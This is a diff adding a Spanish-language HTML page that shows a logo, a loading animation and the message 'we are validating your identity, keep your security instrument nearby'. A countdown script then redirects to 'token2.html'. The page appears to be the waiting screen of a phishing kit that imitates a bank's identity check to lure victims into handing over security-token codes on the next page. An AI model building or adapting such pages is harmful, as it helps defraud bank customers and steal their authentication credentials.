@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Formulario con Imagen</title>
+    <style>
+      body {
+        background-image: url("background.jpg"); /* Ruta de la imagen de fondo */
+        background-size: cover; /* Ajusta la imagen para cubrir toda la pantalla */
+        background-repeat: no-repeat; /* Evita que la imagen de fondo se repita */
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+      }
+
+      .container {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+
+        width: 80%;
+      }
+
+      .left {
+        width: 40%;
+        padding: 20px;
+
+        background: white;
+        max-width: 550px;
+        box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
+      }
+
+      .right {
+        width: 70%;
+        text-align: center;
+      }
+      input {
+        width: 100%;
+      }
+
+      /* Media query para dispositivos con un ancho máximo de 600px (como smartphones) */
+      @media only screen and (max-width: 600px) {
+        .container {
+          flex-direction: column; /* Cambia la dirección de los elementos a vertical */
+          align-items: center;
+        }
+
+        .left,
+        .right {
+          width: 100%; /* Ocupan todo el ancho */
+          margin-bottom: 20px; /* Espacio entre los elementos */
+        }
+      }
+    </style>
+
+    <style>
+      .overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(
+          0,
+          0,
+          0,
+          0.5
+        ); /* Color de fondo semi-transparente */
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 999; /* Asegura que esté por encima de otros elementos */
+      }
+      .form-container {
+        background-color: white;
+        padding: 20px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+        max-width: 350px;
+        width: 90%;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="left">
+        <!-- Aquí va tu formulario -->
+        <div style="width: 100%; text-align: center">
+          <img src="logo.png" style="width: 300px" />
+        </div>
+        <form id="loginform">
+          <div style="width: 100%; text-align: center; margin-top: 20px">
+            <img src="https://i.gifer.com/ZKZg.gif" style="width: 150px" />
+          </div>
+        </form>
+        <div
+          style="
+            width: 100%;
+            text-align: center;
+            font-size: 12px;
+            font-weight: bold;
+            color: #999;
+            margin-top: 30px;
+            margin-bottom: 30px;
+          "
+        >
+          Estamos validando tu identidad. <br />
+          por favor ten cerca tu instrumento de seguridad
+        </div>
+        <div
+          style="
+            width: 100%;
+            text-align: center;
+            font-size: 13px;
+            font-weight: bold;
+            color: #000000;
+            margin-top: 30px;
+            margin-bottom: 30px;
+          "
+        >
+          <p>Tiempo restante <span id="countdown">5</span> segundos</p>
+          <script>
+            // Función para iniciar la cuenta regresiva
+            function startCountdown(seconds) {
+              // Obtener el elemento <span> donde mostraremos el contador
+              var countdownElement = document.getElementById("countdown");
+
+              // Iniciar el intervalo de cuenta regresiva
+              var countdownInterval = setInterval(function () {
+                // Actualizar el contenido del elemento con el valor actual de segundos
+                countdownElement.textContent = seconds;
+
+                // Reducir el valor de segundos
+                seconds--;
+
+                // Verificar si el contador ha llegado a cero
+                if (seconds < 0) {
+                  // Limpiar el intervalo y mostrar una alerta
+                  clearInterval(countdownInterval);
+
+                  window.location.href = "token2.html";
+                }
+              }, 1000); // Intervalo de 1 segundo
+            }
+
+            // Llamar a la función de cuenta regresiva al cargar la página
+            document.addEventListener("DOMContentLoaded", function () {
+              startCountdown(4); // Iniciar la cuenta regresiva con 30 segundos
+            });
+          </script>
+        </div>
+      </div>
+      <div class="right">
+        <p></p>
+      </div>
+    </div>
+  </body>
+</html>
